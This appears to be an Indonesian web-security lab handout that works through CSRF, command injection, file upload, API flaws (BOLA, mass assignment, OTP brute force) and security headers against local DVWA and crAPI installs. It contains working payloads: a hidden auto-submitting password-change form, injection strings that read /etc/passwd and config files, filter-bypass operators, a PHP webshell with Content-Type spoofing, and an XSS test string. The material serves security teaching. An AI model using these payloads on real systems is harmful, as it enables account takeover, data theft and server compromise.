Bagian A — CSRF

Lab A: Cross-Site Request Forgery pada DVWA

DVWA → CSRF Module | Buat halaman HTML penyerang dan verifikasi keberhasilan serangan

A1. Identifikasi CSRF di DVWA

A1

Analisis Request di Burp Suite

Navigasi ke DVWA → CSRF. Coba ubah password dengan nilai yang valid. Intersep request di Burp:

GET /dvwa/vulnerabilities/csrf/?password_new=test &password_conf=test&Change=Change HTTP/1.1 Host: localhost:8888 Cookie: PHPSESSID=xxx; security=low Referer: http://localhost:8888/dvwa/vulnerabilities/csrf/ # Amati: tidak ada token anti-CSRF di request! # Hanya bergantung pada Referer header
A2

Buat Halaman CSRF Attacker

Simpan file HTML berikut sebagai csrf_attack.html:

<!-- csrf_attack.html --> <html><body> <h1>Klik untuk Hadiah! (Fake)</h1> <!-- Hidden CSRF form --> <form id="csrf" action="http://localhost:8888/dvwa/vulnerabilities/csrf/" method="GET"> <input type="hidden" name="password_new" value="hacked123"> <input type="hidden" name="password_conf" value="hacked123"> <input type="hidden" name="Change" value="Change"> </form> <script>document.getElementById('csrf').submit();</script> </body></html>

A2. Eksekusi & Verifikasi

A3

Jalankan Serangan & Verifikasi

Langkah pengujian:

  • Login ke DVWA sebagai admin
  • Buka file csrf_attack.html di tab browser baru (simulasi korban klik link berbahaya)
  • Halaman auto-redirect → verifikasi apakah password berubah
  • Coba logout dan login dengan password "hacked123"
A4

Medium Security — Bypass Referer Check

# Set Security Level ke Medium # DVWA medium cek Referer header # Bypass: gunakan iframe dengan src ke DVWA domain <iframe src="http://localhost:8888/dvwa/..." style="display:none"></iframe> # Atau: Referer spoofing via meta refresh <meta http-equiv="Refresh" content="0; url=http://localhost:8888/dvwa/vulnerabilities/csrf/?...">
Pertanyaan Refleksi — CSRF
  • Mengapa request CSRF berhasil padahal dikirim dari file lokal?
  • Apa yang terjadi jika DVWA menggunakan POST dan mewajibkan CSRF token?
  • Apakah serangan ini masih berhasil jika cookie memiliki SameSite=Strict?
Bagian B — RCE

Lab B: Command Injection & File Upload di DVWA

Demonstrasikan Remote Code Execution melalui dua jalur berbeda

B1. Command Injection

B1

DVWA → Command Injection (Low)

# Task 1: Identifikasi sistem 127.0.0.1; id 127.0.0.1; uname -a 127.0.0.1; hostname # Task 2: Baca file sensitif 127.0.0.1; cat /etc/passwd 127.0.0.1; cat /etc/os-release # Task 3: Cari file konfigurasi web 127.0.0.1; find /var/www -name "*.php" -type f 2>/dev/null | head 127.0.0.1; cat /var/www/html/dvwa/config/config.inc.php # Task 4: Cek koneksi jaringan 127.0.0.1; netstat -tlnp 2>/dev/null | head -20
B2

Bypass Filter (Medium Security)

# Medium: filter "&&" dan ";" # Coba operator alternatif: 127.0.0.1|id ← pipe tanpa spasi 127.0.0.1||id ← OR operator 127.0.0.1%0aid ← URL-encoded newline 127.0.0.1 %26%26 id ← URL encoded && 127.0.0.1`id` ← backtick subshell # Cek source code DVWA untuk lihat filter: # DVWA → PHP Info → View Source di modul

B2. File Upload Attack

B3

DVWA → File Upload (Low)

Buat file webshell.php:

<?php // webshell.php — untuk tujuan pendidikan lab if(isset($_GET['cmd'])){ echo "<pre>"; echo htmlspecialchars(shell_exec($_GET['cmd'])); echo "</pre>"; } ?>
# Upload webshell.php via DVWA File Upload # Setelah upload berhasil: ../../hackable/uploads/webshell.php succesfully uploaded! # Akses dan eksekusi: curl "http://localhost:8888/dvwa/hackable/uploads/webshell.php?cmd=id" uid=33(www-data) gid=33(www-data) # Lebih lanjut: curl "...?cmd=cat+/etc/passwd" curl "...?cmd=ls+/var/www/html" curl "...?cmd=env" ← cek environment variables
B4

Bypass Filter Medium — Content-Type Spoofing

Di Burp Suite, intersep upload request dan ubah Content-Type:

Content-Disposition: form-data; name="uploaded"; filename="webshell.php" Content-Type: image/jpeg ← ubah dari application/x-php ke image/jpeg # Medium hanya cek Content-Type, bukan ekstensi sebenarnya # Server simpan file dengan ekstensi .php → bisa dieksekusi!
Bagian C — API Security

Lab C: Pengujian API dengan OWASP crAPI

crAPI — Completely Ridiculous API: platform latihan API security | Postman + Burp Suite

C1. Setup & Registrasi di crAPI

C1

Buat 2 Akun User untuk Pengujian

# Buka http://localhost:8888 → Register # Buat user A: alice@test.com / Password1! # Buat user B: bob@test.com / Password1! # Login user A via API: curl -X POST http://localhost:8888/identity/api/auth/login \ -H "Content-Type: application/json" \ -d '{"email":"alice@test.com","password":"Password1!"}' {"token":"eyJhbGciOiJIUzI1NiJ9..."} # Simpan token Alice dan Bob secara terpisah di Postman # Environment variable: {{token_alice}}, {{token_bob}}
C2

Test BOLA — API1

# Login sebagai Alice, catat vehicle ID-nya curl -H "Authorization: Bearer {{token_alice}}" \ http://localhost:8888/identity/api/v2/vehicle/dashboard {"vehicles":[{"id":"vehicle-uuid-alice-123"}]} # Gunakan token Alice tapi akses vehicle ID milik Bob curl -H "Authorization: Bearer {{token_alice}}" \ "http://localhost:8888/community/api/v2/community/posts/mechanic/report" \ -d '{"vehicleVIN":"[VIN_milik_Bob]"}' # Jika berhasil → BOLA ditemukan!

C2. Mass Assignment & Rate Limiting

C3

Test Mass Assignment — API3

# Endpoint update profile — coba tambahkan field sensitif curl -X PUT http://localhost:8888/identity/api/v2/user/videos \ -H "Authorization: Bearer {{token_alice}}" \ -H "Content-Type: application/json" \ -d '{"videoName":"test","conversion_params":"--quality 100"}' # conversion_params adalah field yang tidak seharusnya # dapat diset oleh user — test mass assignment! # Test coupon abuse — API6 Unrestricted Business Flow curl -X POST http://localhost:8888/community/api/v2/coupon/validate-coupon \ -H "Authorization: Bearer {{token_alice}}" \ -d '{"coupon_code":"TRAC075"}' # Coba apply coupon yang sama berulang kali!
C4

Rate Limiting Test — API4

# Test apakah ada rate limiting di endpoint OTP # Forget password → kirim OTP 4 digit # Coba brute force dengan Burp Intruder: POST /identity/api/auth/v2/user/login-with-phone-number Body: {"number":"[phone]","otp":"§0000§"} → Intruder Attack Type: Sniper → Payload: Numbers 0000-9999 # Jika tidak ada 429 Rate Limit → rentan!
Gunakan Postman Collection crAPI

Import collection resmi crAPI dari GitHub untuk akses semua endpoint yang sudah terstruktur. Setup environment variable untuk baseUrl, token_alice, token_bob.

Bagian D — Security Headers

Lab D: Analisis & Konfigurasi Security Headers

Evaluasi security posture aplikasi melalui HTTP response headers

D1. Analisis Header DVWA

D1

Ekstrak & Evaluasi Response Headers

# Cek header HTTP response DVWA: curl -I http://localhost:8888/dvwa/login.php 2>/dev/null HTTP/1.1 200 OK Date: Sun, 25 May 2026 ... Server: Apache/2.4.x (Debian) ← Info bocor! X-Powered-By: PHP/7.x ← Info bocor! Content-Type: text/html; charset=UTF-8 # Yang HILANG (seharusnya ada): ❌ Content-Security-Policy ❌ Strict-Transport-Security ❌ X-Frame-Options ❌ X-Content-Type-Options ❌ Referrer-Policy
D2

Bandingkan dengan Situs yang Aman

# Cek header situs yang memiliki security headers baik: curl -I https://github.com 2>/dev/null | grep -iE \ "csp|hsts|x-frame|x-content|referrer|permissions" content-security-policy: default-src 'none'; base-uri 'self'... strict-transport-security: max-age=31536000; includeSubdomains x-frame-options: deny x-content-type-options: nosniff referrer-policy: origin-when-cross-origin

D2. Tambahkan Security Headers ke DVWA

D3

Modifikasi Apache Config (Opsional)

Masuk ke container Docker dan tambahkan header:

docker exec -it dvwa bash # Edit Apache config: nano /etc/apache2/conf-enabled/security.conf # Tambahkan header: Header always set X-Frame-Options "DENY" Header always set X-Content-Type-Options "nosniff" Header always set Referrer-Policy "strict-origin-when-cross-origin" Header always set Content-Security-Policy "default-src 'self'" Header always set Permissions-Policy "geolocation=(), camera=()" service apache2 restart # Verifikasi: curl -I http://localhost:8888/dvwa/login.php
D4

Verifikasi Efek CSP pada XSS

Setelah header CSP aktif, uji kembali XSS dari Lab 9:

# Coba lagi payload XSS setelah CSP aktif: <script>alert('XSS')</script> # Expected: browser blokir script — konsol error: # "Refused to execute inline script because it violates # the following Content Security Policy directive" # Catat: apakah XSS berhasil atau diblokir?
